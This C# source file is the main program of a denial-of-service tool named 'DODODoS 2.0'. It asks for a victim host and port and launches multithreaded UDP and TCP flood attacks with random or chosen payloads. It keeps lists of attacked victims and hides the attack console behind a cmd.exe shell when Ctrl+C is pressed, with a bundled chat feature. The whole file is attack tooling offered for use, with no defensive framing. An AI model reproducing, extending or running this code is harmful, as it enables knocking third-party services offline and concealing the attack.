using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Net;
using Chat;
using System.Net.Sockets;

namespace DODODoS {
    class Program {
        static Dictionary<String, Action> cmd;
        static List<Tuple<string, UDP>> UdpVictims = new List<Tuple<string, UDP>>();
        static List<Tuple<string, TCP>> TcpVictims = new List<Tuple<string, TCP>>();
        static Process FakeConsole = new Process();
        static string FakeConsoleLog = "";
        static readonly string FakeConsolePointer = @"C:\User\{0}";
        static string[] ChatBuffer = new string[Console.WindowHeight - 5];
        static int ptr = 0;

        static object toLockSyncThread = new object();
        static object toLockSyncHiddenNot = new object();
        static object toLockChat = new object();

        static void Main(string[] args) {
            Console.CancelKeyPress += Console_CancelKeyPress;
            bool exit = true;
            CreateFakeConsole();
            LoadCommands();
            Help();

            while (exit) {
                lock (toLockSyncHiddenNot) { Console.Write("DODODoS> "); } //This will leave the thread in a holded state as if it has been paused when the ddos is hidden
                string command = Console.ReadLine(); //Control+C will leave a null string resulting in Argument Exception
                if (command != null && cmd.ContainsKey(command)) //No argument Exception cause the first check is on the null
                    cmd[command]();
                else if (command != null) //No Control-C
                    Console.WriteLine("Unknown command");
            }
        }
        /// <summary>
        /// This method erase the console and let u use the windows commands
        /// </summary>
        static void Console_CancelKeyPress(object sender, ConsoleCancelEventArgs e) {
            lock (toLockSyncHiddenNot) {
                e.Cancel = true;
                Console.Clear();
                Console.Write(FakeConsoleLog);
                FakeConsoleLog = "";
                string command = "";
                command = Console.ReadLine();
                while (command != "exit") {
                    FakeConsole.StandardInput.WriteLine(command);
                    while (FakeConsoleLog != "") {
                        lock (toLockSyncThread) {
                            Console.WriteLine(FakeConsoleLog);
                            FakeConsoleLog = "";
                        }
                    }
                    Console.Write(FakeConsolePointer + ">");
                    command = Console.ReadLine();    //Write what is new in the log, writes the pointer and whaits for commands
                }
            }
        }
        /// <summary>
        /// Creates the fake console
        /// </summary>
        static void CreateFakeConsole() {
            ProcessStartInfo psi = new ProcessStartInfo() {
                FileName = "cmd.exe",
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
            };
            FakeConsole.StartInfo = psi;
            FakeConsole.Start();
            #region Creazione thread lettura
            new Thread(() => {
                while (!FakeConsole.StandardOutput.EndOfStream) {
                    string s = FakeConsole.StandardOutput.ReadLine();
                    lock (toLockSyncThread) {
                        FakeConsoleLog += s + "\n";
                    }
                }
            }) { IsBackground = true, }.Start();
            new Thread(() => {
                while (!FakeConsole.StandardError.EndOfStream) {
                    string s = FakeConsole.StandardError.ReadLine();
                    lock (toLockSyncThread) {
                        FakeConsoleLog += s + "\n";
                    }
                }
            }) { IsBackground = true, }.Start();
            #endregion
        }
        /// <summary>
        /// Loads the commands in the dictionary
        /// </summary>
        static void LoadCommands() {
            #region <USELESS CODE>
            ConsoleColor tmp = Console.ForegroundColor;
            Console.ForegroundColor = Console.BackgroundColor;
            Console.BackgroundColor = tmp;
            Console.WriteLine("Welcome to DODODoS 2.0");
            GetLocalIP();
            Console.BackgroundColor = Console.ForegroundColor;
            Console.ForegroundColor = tmp;
            #endregion
            cmd = new Dictionary<string, Action>();
            cmd.Add("udp", new Action(UDP));
            cmd.Add("tcp", new Action(TCP));
            cmd.Add("ip", new Action(GetLocalIP));
            cmd.Add("stop", new Action(Stop));
            cmd.Add("list", new Action(List));
            cmd.Add("clear", new Action(Clear));
            cmd.Add("help", new Action(Help));
            cmd.Add("chat", new Action(StartChat));
            cmd.Add("exit", new Action(Exit));

        }
        static void GetLocalIP() {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            bool print = false;
            foreach (var ip in host.AddressList) {
                if (ip.AddressFamily == AddressFamily.InterNetwork) {
                    if (print)

                        Console.WriteLine("My IP: " + ip.ToString());
                    print = true;
                }
            }
        }
        static void Exit() {
            Environment.Exit(0);
        }
        static void Clear() {
            Console.Clear();
        }
        /// <summary>
        /// Prints the list of commands
        /// </summary>
        static void Help() {
            Console.WriteLine("Available commands:");
            foreach (string s in cmd.Keys) {
                Console.WriteLine("  " + s);
            }
        }
        /// <summary>
        /// Lists all current attacks
        /// </summary>
        static void List() {
            int count = 0;
            if (UdpVictims.Count > 0) {
                Console.WriteLine("UDP sessions:");
                /*foreach (Tuple<string, UDP> victim in UdpVictims)
                    Console.WriteLine("   {0}", victim.Item1);*/
                for (; count < UdpVictims.Count; count++)
                    Console.WriteLine(" {0}.  {1}", count, UdpVictims[count].Item1);
            } else
                Console.WriteLine("No UDP sessions.");

            if (TcpVictims.Count > 0) {
                Console.WriteLine("TCP sessions:");
                /*foreach (Tuple<string, TCP> victim in TcpVictims)
                    Console.WriteLine("   {0}", victim.Item1);*/
                for (int i = 0; i < TcpVictims.Count; count++, i++)
                    Console.WriteLine(" {0}.  {1}", count, TcpVictims[i].Item1);
            } else
                Console.WriteLine("No TCP sessions.");
        }
        /// <summary>
        /// Starts a UDP attack
        /// </summary>
        static void UDP() {
            string host;
            int port;
            byte[] message;
            Collect(out host, out port, out message);
            Console.WriteLine("Attacking...");

            UdpVictims.Insert(0, new Tuple<string, UDP>(host + ":" + port, new UDP()));
            UdpVictims[0].Item2.Connect(host, port);
            UdpVictims[0].Item2.Attack(message, Environment.ProcessorCount * 2);
        }
        /// <summary>
        /// Starts a TCP attack
        /// </summary>
        static void TCP() {
            string host;
            int port;
            byte[] message;
            TCP t;
            Collect(out host, out port, out message);
            Console.WriteLine("Attacking...");

            t = new TCP();
            bool conn = t.Connect(host, port);

            for (int i = 0; i < 5 && !conn; i++) {
                Console.WriteLine("Can't connect. Retrying...");
                conn = t.Connect(host, port);
            }
            if (conn) {
                TcpVictims.Insert(0, new Tuple<string, TCP>(host + ":" + port, t));
                TcpVictims[0].Item2.Attack(message, Environment.ProcessorCount * 2);
            }
        }
        /// <summary>
        /// Stops all running attacks
        /// </summary>
        static void Stop() {
            Console.WriteLine("Wich session do you want to stop?");
            List();
            Console.Write("[All]> ");
            int n = -1;
            try {
                n = Convert.ToInt32(Console.ReadLine());
            } catch {
            }
            if (n == -1) {
                foreach (Tuple<string, UDP> victim in UdpVictims)
                    victim.Item2.Stop();
                foreach (Tuple<string, TCP> victim in TcpVictims)
                    victim.Item2.Stop();
                UdpVictims.Clear();
                TcpVictims.Clear();
            } else {
                if (n > UdpVictims.Count - 1) {
                    TcpVictims[n - (UdpVictims.Count)].Item2.Stop();
                    TcpVictims.RemoveAt(n - (UdpVictims.Count));
                } else {
                    UdpVictims[n].Item2.Stop();
                    UdpVictims.RemoveAt(n);
                }
            }
            Console.WriteLine("Session(s) stopped succesfully.");
        }
        /// <summary>
        /// Collects the input from the user
        /// </summary>
        /// <param name="host">The host name or ip of the victim</param>
        /// <param name="port">The port of the victim</param>
        /// <param name="message">the message to send</param>
        static void Collect(out string host, out int port, out byte[] message) {
            Console.Write("Victim: ");
            host = Console.ReadLine();
            Console.Write("Port: ");
            port = Convert.ToInt32(Console.ReadLine());
            Console.Write("Random string or message? [R/M]: ");
            if (Console.ReadLine() == "r") {
                Console.Write("String lenght: ");
                message = Generate(Convert.ToInt32(Console.ReadLine()));
            } else {
                Console.Write("Message: ");
                message = Encoding.ASCII.GetBytes(Console.ReadLine());
            }
        }
        /// <summary>
        /// Generates a random byte array
        /// </summary>
        /// <param name="lenght">The lenght of the array to be generated</param>
        /// <returns>The array</returns>
        static byte[] Generate(int lenght) {
            byte[] b = new byte[lenght];
            for (int i = 0; i < lenght; i++)
                b[i] = Convert.ToByte(new Random().Next(255));
            return b;
        }
        static void StartChat() {
            Console.Clear();
            consoleInterface.DrawTop("DodoSWAG CHAT 1.00");
            consoleInterface.WriteDirect(3, 0, "<sys>Username: ");
            string username = Console.ReadLine();
            string message = "";
            new Thread(() => {
                while (true) {
                    var v = littleChat.Receive();
                    EditChatBuffer(v);

                    consoleInterface.DrawTop("DodoSWAG CHAT 1.00");
                    for (int i = 0; i < ChatBuffer.Length; i++) {
                        consoleInterface.WriteDirect(i + 3, 1, ChatBuffer[i]);
                    }

                }

            }) { IsBackground = true }.Start();
            new Thread(() => {
                while (true) {
                    WriteChatBuffer();
                    Thread.Sleep(1000);
                }
            }) { IsBackground = true }.Start();
            while (message != "/exit") {
                consoleInterface.WriteDirect(Console.WindowHeight - 1, 0, " > ");
                message = "<" + username + ">" + Console.ReadLine();
                consoleInterface.DrawTop("DodoSWAG CHAT 1.00");
                littleChat.Send(message);
                EditChatBuffer(message);
            }


        }
        static void EditChatBuffer(string l) {
            consoleInterface.ClearLine(ptr + 4);
            if (ptr < ChatBuffer.Length) {
                ChatBuffer[ptr] = l;
                ptr++;
            } else {
                ptr = 0;
                ChatBuffer[ptr] = l;

            }

        }
        static void WriteChatBuffer() {
            var top = Console.WindowHeight - 1;
            var left = Console.CursorLeft;
            for (int i = 0; i < ChatBuffer.Length; i++) {
                consoleInterface.WriteDirect(i + 4, 1, ChatBuffer[i] ?? "");
            }
            Console.CursorTop = top;
            Console.CursorLeft = left;
        }

    }
}
